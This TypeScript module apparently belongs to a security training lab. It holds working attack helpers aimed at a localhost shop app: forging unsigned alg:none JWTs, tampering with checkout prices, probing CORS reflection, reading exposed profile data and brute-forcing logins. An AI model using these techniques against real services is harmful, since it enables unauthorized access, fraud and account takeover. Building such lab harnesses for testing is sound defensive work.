// Reusable attacks for the config/logic cluster: JWT alg:none (#19), sensitive
// data exposure (#21), business-logic price tampering (#22), CORS misconfig
// (#23), missing rate limiting (#24).

const BASE = process.env.KARTLY_URL ?? "http://localhost:4000";

function b64url(obj: unknown): string {
  return Buffer.from(JSON.stringify(obj)).toString("base64url");
}

// #19 JWT: forge an UNSIGNED token (alg:none) with arbitrary claims.
export function forgeNoneToken(claims: Record<string, unknown>): string {
  return `${b64url({ alg: "none", typ: "JWT" })}.${b64url(claims)}.`;
}

// Use a forged token as a Bearer to reach a role-gated endpoint.
export async function sellerAreaWithToken(token: string) {
  const res = await fetch(`${BASE}/api/seller/products`, {
    headers: { Authorization: `Bearer ${token}` },
  });
  return { status: res.status };
}

// #21 data exposure: read /api/me and inspect the returned user object.
export async function readMe(cookie: string) {
  const res = await fetch(`${BASE}/api/me`, { headers: { Cookie: cookie } });
  const json = (await res.json().catch(() => ({}))) as { user?: Record<string, unknown> };
  return { status: res.status, user: json.user ?? {} };
}

// #22 business logic: checkout an item at an attacker-chosen unit price.
export async function checkoutTampered(
  cookie: string,
  csrf: string,
  productId: string,
  unitPrice: number,
  qty = 1,
) {
  const res = await fetch(`${BASE}/api/orders`, {
    method: "POST",
    headers: { Cookie: cookie, "X-CSRF-Token": csrf, "Content-Type": "application/json" },
    body: JSON.stringify({ items: [{ productId, qty, unitPrice }] }),
  });
  const json = (await res.json().catch(() => ({}))) as { order?: { total: number } };
  return { status: res.status, total: json.order?.total };
}

// #23 CORS: probe how the API reflects a foreign Origin.
export async function corsProbe(origin: string) {
  const res = await fetch(`${BASE}/api/products`, { headers: { Origin: origin } });
  return {
    status: res.status,
    allowOrigin: res.headers.get("access-control-allow-origin") ?? "",
    allowCredentials: res.headers.get("access-control-allow-credentials") ?? "",
  };
}

// #24 rate limiting: fire N bad logins; count how many were NOT throttled (429).
export async function bruteLogin(email: string, attempts: number) {
  let notThrottled = 0;
  let sawThrottle = false;
  for (let i = 0; i < attempts; i++) {
    const res = await fetch(`${BASE}/api/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password: `wrong-${i}` }),
    });
    if (res.status === 429) sawThrottle = true;
    else notThrottled++;
  }
  return { notThrottled, sawThrottle };
}

export function printLoot(title: string, loot: string) {
  // eslint-disable-next-line no-console
  console.log(`\n  🩸 ${title}\n${loot}\n`);
}
